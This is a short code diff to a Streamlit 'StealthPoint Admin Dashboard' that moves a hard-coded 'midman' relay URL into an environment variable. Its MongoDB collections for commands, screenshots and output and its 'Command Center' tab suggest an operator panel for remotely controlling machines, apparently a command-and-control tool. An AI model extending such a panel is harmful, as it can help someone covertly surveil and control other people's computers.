@@ -10,8 +10,7 @@ import requests
 st.set_page_config(page_title="StealthPoint Admin Dashboard", layout="wide")
 # Replace this with your actual connection string from MongoDB Atlas
 MONGO_URI = os.getenv("MONGO_URI") or st.secrets("MONGO_URI")
-midmanurl = "http://127.0.0.1:5000/live"
-
+midmanurl = os.getenv("MIDMAN_URL") or st.secrets("MIDMAN_URL")
 
 @st.cache_resource
 def get_connect():
@@ -24,7 +23,7 @@ cmds_col = db["commands"]
 screenshot = db["screenshots"]
 outputs = db["output"]
 tab1 , tab2 = st.tabs(["Dashboard", "Command Center"])
-
+#
 # --- SIDEBAR FILTERS ---
 st.sidebar.title("🔍 Search Filters")
 user_search = st.sidebar.text_input("Search by Username")
